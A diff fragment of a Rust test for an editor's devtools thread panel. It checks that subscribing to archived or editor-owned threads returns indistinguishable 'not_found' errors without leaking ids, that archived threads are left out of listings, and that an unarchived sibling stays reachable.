+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let editor = crate::test_support::active_thread_id(&app.panel, &app.cx).to_key_string();
+    let (_announce, panel) = connect_panel("/p/app", 1, &app, cx);
+    let archived = created_thread(&panel, &app, cx);
+    promote(&archived, cx);
+    let sibling = created_thread(&panel, &app, cx);
+    let archived_id = thread_id_of(&archived, cx);
+    cx.update(|cx| {
+        crate::thread_metadata_store::ThreadMetadataStore::global(cx)
+            .update(cx, |store, cx| store.archive(archived_id, None, cx))
+    });
+    cx.run_until_parked();
+
+    let mut answers = Vec::new();
+    for (n, id) in [editor.as_str(), archived.as_str()].into_iter().enumerate() {
+        let rid = format!("s{n}");
+        panel.handle(
+            request("subscribe", &rid, json!({ "target": { "thread_id": id } })),
+            &app.app_state(),
+            cx,
+        );
+        let answer = reply(&panel.drain(cx), &rid);
+        assert_eq!(answer["error"], "not_found", "{answer}");
+        answers.push(without_id(answer));
+    }
+    assert_eq!(
+        answers[0], answers[1],
+        "archived devtools vs editor thread: indistinguishable"
+    );
+    assert!(
+        !serde_json::to_string(&answers)
+            .expect("json")
+            .contains(&archived),
+        "no id echoed back"
+    );
+    panel.handle(
+        request("list_threads", "l", json!({})),
+        &app.app_state(),
+        cx,
+    );
+    let listed = reply(&panel.drain(cx), "l");
+    let ids: Vec<&str> = listed["items"]
+        .as_array()
+        .expect("items")
+        .iter()
+        .filter_map(|t| t["thread_id"].as_str())
+        .collect();
+    assert_eq!(
+        ids,
+        vec![sibling.as_str()],
+        "R5.4: the archived one is not listed"
+    );
+
+    // Converse: archiving one devtools thread does not hide its unarchived sibling.
+    panel.handle(
+        request(
+            "subscribe",
+            "s",
+            json!({ "target": { "thread_id": sibling } }),
+        ),
+        &app.app_state(),
+        cx,
+    );
+    assert_eq!(reply(&panel.drain(cx), "s")["kind"], "snapshot");
+}
